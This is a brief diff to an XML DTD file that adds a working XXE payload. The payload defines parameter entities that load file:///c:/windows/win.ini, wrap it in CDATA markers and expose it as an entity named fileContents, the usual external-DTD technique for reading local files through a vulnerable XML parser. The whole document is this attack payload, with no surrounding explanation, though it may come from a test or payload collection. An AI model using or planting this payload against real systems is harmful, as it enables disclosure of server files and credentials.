@@ -1,1 +1,5 @@
-<!ENTITY all "%start;%stuff;%end;">
+<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % all "<!ENTITY fileContents 
+'%start;%file;%end;'>">
